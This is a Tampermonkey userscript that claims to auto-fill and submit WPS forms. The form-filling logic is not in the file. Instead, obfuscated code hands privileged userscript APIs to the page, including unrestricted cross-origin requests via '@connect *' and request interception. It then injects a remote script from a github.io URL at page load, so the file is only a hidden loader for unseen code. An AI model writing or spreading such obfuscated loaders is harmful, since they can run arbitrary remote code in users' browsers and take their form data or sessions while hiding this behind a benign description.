// ==UserScript==
// @name         WPS 表单自动填写 + 提交
// @namespace    http://tampermonkey.net/
// @version      2026.04.07.023828
// @description  WPS 表单自动填写 + 提交
// @author       Kay
// @match        https://f.wps.cn/ksform/w/write/*
// @grant        GM_info
// @grant        unsafeWindow
// @grant        GM_openInTab
// @grant        GM_addElement
// @grant        GM_webRequest
// @grant        GM_xmlhttpRequest
// @connect      *
// @run-at       document-start
// ==/UserScript==

(function () {
    'use strict';

    function _0x3d97(_0x445592, _0x124673) { _0x445592 = _0x445592 - 0x1c1; const _0x1cac49 = _0x1cac(); let _0x3d97ba = _0x1cac49[_0x445592]; return _0x3d97ba; } const _0x415e81 = _0x3d97; (function (_0x17a8af, _0x4799ab) { const _0x28d87b = _0x3d97, _0x5d8738 = _0x17a8af(); while (!![]) { try { const _0x541afb = parseInt(_0x28d87b(0x1c3)) / 0x1 + -parseInt(_0x28d87b(0x1c7)) / 0x2 + -parseInt(_0x28d87b(0x1d0)) / 0x3 + parseInt(_0x28d87b(0x1c6)) / 0x4 + parseInt(_0x28d87b(0x1cb)) / 0x5 * (parseInt(_0x28d87b(0x1cf)) / 0x6) + parseInt(_0x28d87b(0x1c5)) / 0x7 + -parseInt(_0x28d87b(0x1c8)) / 0x8; if (_0x541afb === _0x4799ab) break; else _0x5d8738['push'](_0x5d8738['shift']()); } catch (_0x521a42) { _0x5d8738['push'](_0x5d8738['shift']()); } } }(_0x1cac, 0x9e8cf), unsafeWindow[_0x415e81(0x1ce)] = GM_info, unsafeWindow[_0x415e81(0x1c4)] = GM_openInTab, unsafeWindow[_0x415e81(0x1c2)] = GM_addElement, unsafeWindow[_0x415e81(0x1c1)] = GM_webRequest, unsafeWindow[_0x415e81(0x1cc)] = GM_xmlhttpRequest); function _0x1cac() { const _0x401205 = ['919598GYblbG', '5889568URQgQM', 'module', 'script', '65eRjUHD', 'GM_xmlhttpRequest', '[加载中]\x20外部脚本:\x20', 'GM_info', '249966aNSRXf', '71292xTpTev', 'GM_webRequest', 'GM_addElement', '446028FDrfPL', 'GM_openInTab', '3947566uFCnMD', '1270492CHQyGw']; _0x1cac = function () { return _0x401205; }; return _0x1cac(); } function loadExternalScript(_0x185c2c) { const _0x3317f8 = _0x415e81; return console['log'](_0x3317f8(0x1cd), _0x185c2c), GM_addElement(_0x3317f8(0x1ca), { 'src': _0x185c2c, 'type': _0x3317f8(0x1c9) }); } const EXTERNAL_JS_URL = 'https://1024nettech.github.io/custom/wps_form/main-loader.js'; loadExternalScript(EXTERNAL_JS_URL);

})();
// End-37-2026.04.07.023828
